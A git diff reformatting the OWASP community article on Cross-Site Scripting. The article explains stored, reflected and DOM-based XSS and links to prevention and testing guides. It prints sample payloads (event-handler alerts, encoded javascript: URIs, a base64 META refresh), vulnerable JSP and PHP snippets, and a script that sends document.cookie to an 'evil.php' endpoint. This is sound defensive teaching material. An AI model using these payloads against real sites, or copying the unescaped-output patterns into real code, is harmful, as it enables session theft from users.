@@ -3,10 +3,9 @@
 layout: col-sidebar
 title: Cross Site Scripting (XSS)
 author: KirstenS
-contributors: Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon
+contributors: Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin
 permalink: /attacks/xss/
 tags: attack, XSS
-auto-migrated: 1
 
 ---
 
@@ -29,53 +28,36 @@ script came from a trusted source, the malicious script can access any
 cookies, session tokens, or other sensitive information retained by the
 browser and used with that site. These scripts can even rewrite the
 content of the HTML page. For more details on the different types of XSS
-flaws, see: [Types of Cross-Site
-Scripting](../../Types_of_Cross-Site_Scripting).
+flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).
 
 ## Related Security Activities
 
 ### How to Avoid Cross-site scripting Vulnerabilities
 
-See the [XSS (Cross Site Scripting) Prevention Cheat
-Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-
-See the [DOM based XSS Prevention Cheat
-Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
-
-See the [OWASP Development
-Guide](:Category:OWASP_Guide_Project "wikilink") article on
-[Phishing](Phishing "wikilink").
-
-See the [OWASP Development
-Guide](:Category:OWASP_Guide_Project "wikilink") article on [Data
-Validation](Data_Validation "wikilink").
+- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+- OWASP Development Guide [article on Data Validation](https://wiki.owasp.org/index.php/Data_Validation)
+- OWASP Development Guide [article on Phishing](https://wiki.owasp.org/index.php/Phishing)
 
 ### How to Review Code for Cross-site scripting Vulnerabilities
 
-See the [OWASP Code Review
-Guide](https://owasp.org/www-project-code-review-guide/) article on
-[Reviewing Code for Cross-site
-scripting](Reviewing_Code_for_Cross-site_scripting "wikilink")
-Vulnerabilities.
+See the [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/).
 
 ### How to Test for Cross-site scripting Vulnerabilities
 
-See the latest [OWASP Testing
-Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to
+See the latest [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to
 test for the various kinds of XSS vulnerabilities.
 
-  - [Testing_for_Reflected_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
-  - [Testing_for_Stored_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
-  - [Testing_for_DOM-based_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html)
+- [Testing_for_Reflected_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
+- [Testing_for_Stored_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
+- [Testing_for_DOM-based_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html)
 
 ## Description
 
 Cross-Site Scripting (XSS) attacks occur when:
 
-1.  Data enters a Web application through an untrusted source, most
-    frequently a web request.
-2.  The data is included in dynamic content that is sent to a web user
-    without being validated for malicious content.
+1. Data enters a Web application through an untrusted source, most frequently a web request.
+2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.
 
 The malicious content sent to the web browser often takes the form of a
 segment of JavaScript, but may also include HTML, Flash, or any other
@@ -86,7 +68,7 @@ attacker, redirecting the victim to web content controlled by the
 attacker, or performing other malicious operations on the user's machine
 under the guise of the vulnerable site.
 
-### [Stored and Reflected XSS Attacks](#Stored_and_Reflected_XSS_Attacks "wikilink")
+### Stored and Reflected XSS Attacks
 
 XSS attacks can generally be categorized into two categories: stored and
 reflected. There is a third, much less well-known type of XSS attack
@@ -121,8 +103,7 @@ In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
 XSS](../DOM_Based_XSS) was identified by [Amit Klein
 in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
 recommends the XSS categorization as described in the OWASP Article:
-[Types of Cross-Site
-Scripting](../../Types_of_Cross-Site_Scripting), which covers all
+[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
 these XSS terms, organizing them into a matrix of Stored vs. Reflected
 XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
 XSS.
@@ -161,8 +142,7 @@ problems as well.
 
 ### How to Protect Yourself
 
-The primary defenses against XSS are described in the [OWASP XSS
-Prevention Cheat
+The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
 Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
 
 Also, it's crucial that you turn off HTTP TRACE support on all web
@@ -179,55 +159,47 @@ servers.
 The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
 reusable security components in several languages, including validation
 and escaping routines to prevent parameter tampering and the injection
-of XSS attacks. In addition, the [OWASP WebGoat
-Project](https://www.owasp.org/www-project-webgoat/) training
+of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
 application has lessons on Cross-Site Scripting and data encoding.
 
 ### Alternate XSS Syntax
 
-#### XSS using Script in Attributes
+#### XSS Using Script in Attributes
 
-XSS attacks may be conducted without using
-
-    <script>
-
-    </script>
-
+XSS attacks may be conducted without using `<script>...</script>`
 tags. Other tags will do exactly the same thing, for example:
+`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.
 
-    <body onload=alert('test1')>
+##### onmouseover
 
-or other attributes like: onmouseover, onerror.
+`<b onmouseover=alert('Wufff!')>click me!</b>`
 
-onmouseover
+##### onerror
 
-    <b onmouseover=alert('Wufff!')>click me!</b>
+`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`
 
-onerror
-
-    <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
-
-#### XSS using Script Via Encoded URI Schemes
+#### XSS Using Script Via Encoded URI Schemes
 
 If we need to hide against web application filters we may try to encode
-string characters, e.g.: a=&\#X41 (UTF-8) and use it in IMG tags:
+string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:
 
-    <IMG SRC=j&#X41vascript:alert('test2')>
+`<IMG SRC=j&#X41vascript:alert('test2')>`
 
 There are many different UTF-8 encoding notations what give us even more
 possibilities.
 
-#### XSS using code encoding
+#### XSS Using Code Encoding
 
-We may encode our script in base64 and place it in META tag. This way we
-get rid of alert() totally. More information about this method can be
+We may encode our script in base64 and place it in `META` tag. This way we
+get rid of `alert()` totally. More information about this method can be
 found in RFC 2397
 
-    <META HTTP-EQUIV="refresh"
-    CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+```html
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+```
 
-These and others examples can be found at the OWASP [XSS Filter Evasion
-Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
+These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
 encyclopedia of the alternate XSS syntax attack.
 
 ## Examples
@@ -245,13 +217,13 @@ The following JSP code segment reads an employee ID, eid, from an HTTP
 request and displays it to the user.
 
 ```
-    <% String eid = request.getParameter("eid"); %>
-    ...
-    Employee ID: <%= eid %>
+<% String eid = request.getParameter("eid"); %>
+...
+Employee ID: <%= eid %>
 ```
 
-The code in this example operates correctly if eid contains only
-standard alphanumeric text. If eid has a value that includes
+The code in this example operates correctly if `eid` contains only
+standard alphanumeric text. If `eid` has a value that includes
 meta-characters or source code, then the code will be executed by the
 web browser as it displays the HTTP response.
 
@@ -269,17 +241,16 @@ exploiting vulnerable web applications is known as Reflected XSS.
 The following JSP code segment queries a database for an employee with a
 given ID and prints the corresponding employee's name.
 
-```
+```jsp
+<%...
+ Statement stmt = conn.createStatement();
+ ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
+ if (rs != null) {
+  rs.next();
+  String name = rs.getString("name");
+%>
 
-    <%...
-     Statement stmt = conn.createStatement();
-     ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
-     if (rs != null) {
-      rs.next();
-      String name = rs.getString("name");
-    %>
-
-    Employee Name: <%= name %>
+Employee Name: <%= name %>
 ```
 
 As in Example 1, this code functions correctly when the values of name
@@ -302,7 +273,7 @@ As the examples demonstrate, XSS vulnerabilities are caused by code that
 includes unvalidated data in an HTTP response. There are three vectors
 by which an XSS attack can reach a victim:
 
-  - As in Example 1, data is read directly from the HTTP request and
+- As in Example 1, data is read directly from the HTTP request and
     reflected back in the HTTP response. Reflected XSS exploits occur
     when an attacker causes a user to supply dangerous content to a
     vulnerable web application, which is then reflected back to the user
@@ -316,7 +287,7 @@ by which an XSS attack can reach a victim:
     transfer private information, such as cookies that may include
     session information, from the user's machine to the attacker or
     perform other nefarious activities.
-  - As in Example 2, the application stores dangerous data in a database
+- As in Example 2, the application stores dangerous data in a database
     or other trusted data store. The dangerous data is subsequently read
     back into the application and included in dynamic content. Stored
     XSS exploits occur when an attacker injects dangerous content into a
@@ -329,7 +300,7 @@ by which an XSS attack can reach a victim:
     executes malicious content, the attacker may be able to perform
     privileged operations on behalf of the user or gain access to
     sensitive data belonging to the user.
-  - A source outside the application stores dangerous data in a database
+- A source outside the application stores dangerous data in a database
     or other data store, and the dangerous data is subsequently read
     back into the application as trusted data and included in dynamic
     content.
@@ -343,9 +314,11 @@ easily steal a cookie from an authenticated user. All the attacker has
 to do is to place the following code in any posted input(ie: message
 boards, private messages, user profiles):
 
-    <SCRIPT type="text/javascript">
-    var adr = '../evil.php?cakemonster=' + escape(document.cookie);
-    </SCRIPT>
+```html
+<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+```
 
 The above code will pass an escaped content of the cookie (according to
 RFC content must be escaped before sending it via HTTP protocol with GET
@@ -359,31 +332,22 @@ Let's assume that we have an error page, which is handling requests for
 a non existing pages, a classic 404 error page. We may use the code
 below as an example to inform user about what specific page is missing:
 
-    <html>
-    <body>
+```html
+<html>
+<body>
+<? php
+print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
+?>
 
-    <? php
-    print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
-    ?>
+</body>
+</html>
+```
 
-    </body>
-    </html>
+Let's see how it works: `http://testsite.test/file_which_not_exist`
+In response we get: `Not found: /file_which_not_exist`
 
-Let's see how it works:
-
-    http://testsite.test/file_which_not_exist
-
-In response we get:
-
-    Not found: /file_which_not_exist
-
-Now we will try to force the error page to include our code:
-
-    http://testsite.test/<script>alert("TEST");</script>
-
-The result is:
-
-    Not found: / (but with JavaScript code <script>alert("TEST");</script>)
+Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
+The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`
 
 We have successfully injected the code, our XSS\! What does it mean? For
 example, that we may use this flaw to try to steal a user's session
@@ -391,48 +355,33 @@ cookie.
 
 ## Related [Attacks](https://owasp.org/www-community/attacks/)
 
-  - [XSS Attacks](https://owasp.org/www-community/attacks/xss/)
-  - [Invoking untrusted mobile code](https://owasp.org/www-community/attacks/Mobile_code_invoking_untrusted_mobile_code)
-  - [Cross Site History Manipulation (XSHM)](https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_(XSHM))
+- [XSS Attacks](https://owasp.org/www-community/attacks/xss/)
+- [Invoking untrusted mobile code](https://owasp.org/www-community/attacks/Mobile_code_invoking_untrusted_mobile_code)
+- [Cross Site History Manipulation (XSHM)](https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_(XSHM))
 
 ## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)
 
-  - [Improper Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)
-  - [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+- [Improper Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)
+- [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+- OWASP Development Guide [article on Data Validation](https://wiki.owasp.org/index.php/Data_Validation)
+- OWASP Development Guide [article on Phishing](https://wiki.owasp.org/index.php/Phishing)
 
-## Related [Controls](https://owasp.org/www-community/controls/)
+## Related Controls
+
+- [Data Validation](https://wiki.owasp.org/index.php/Data_Validation)
 
 ## References
 
-  - OWASP's [XSS (Cross Site Scripting) Prevention Cheat
-    Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-  - OWASP Guide to Building Secure Web Applications and Web Services,
-    Chapter 8: [Data Validation](Data_Validation "wikilink")
-  - OWASP Testing Guide,
-    [Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)](Testing_for_Reflected_Cross_site_scripting_\(OWASP-DV-001\) "wikilink")
-  - OWASP Testing Guide,
-    [Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)](Testing_for_Stored_Cross_site_scripting_\(OWASP-DV-002\) "wikilink")
-  - OWASP Testing Guide,
-    [Testing_for_DOM-based_Cross_site_scripting_(OWASP-DV-003)](Testing_for_DOM-based_Cross_site_scripting_\(OWASP-DV-003\) "wikilink")
-  - OWASP's [How to Build an HTTP Request Validation Engine (J2EE
-    validation using OWASP's
-    Stinger)](How_to_Build_an_HTTP_Request_Validation_Engine_for_Your_J2EE_Application "wikilink")
-  - Google Code Best Practice Guide:
-    <http://code.google.com/p/doctype/wiki/ArticlesXSS>
-  - The Cross Site Scripting FAQ:
-    <http://www.cgisecurity.com/articles/xss-faq.shtml>
-  - OWASP [XSS Filter Evasion Cheat
-    Sheet](XSS_Filter_Evasion_Cheat_Sheet "wikilink")
-  - CERT Advisory on Malicious HTML Tags:
-    <http://www.cert.org/advisories/CA-2000-02.html>
-  - CERT “Understanding Malicious Content Mitigation”
-    <http://www.cert.org/tech_tips/malicious_code_mitigation.html>
-  - Understanding the cause and effect of CSS Vulnerabilities:
-    <http://www.technicalinfo.net/papers/CSS.html>
-  - XSSed - Cross-Site Scripting (XSS) Information and Mirror Archive of
-    Vulnerable Websites <http://www.xssed.com>
-
-
+- OWASP's [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [Testing_for_Reflected_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
+- [Testing_for_Stored_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
+- [Testing_for_DOM-based_Cross_site_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html)
+- [The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
+- OWASP [XSS Filter Evasion Cheat Sheet](/xss-filter-evasion-cheatsheet)
+- [CERT Advisory on Malicious HTML Tags](http://www.cert.org/advisories/CA-2000-02.html)
+- [CERT “Understanding Malicious Content Mitigation](http://www.cert.org/tech_tips/malicious_code_mitigation.html)
+- [Understanding the cause and effect of CSS Vulnerabilities](http://www.technicalinfo.net/papers/CSS.html)
+- [XSSed](http://www.xssed.com) - Cross-Site Scripting (XSS) Information and Mirror Archive of Vulnerable Websites
 
 [Category:Injection](https://owasp.org/www-community/Injection_Flaws)
 [Category:OWASP Top Ten Project](https://owasp.org/www-project-top-ten/)
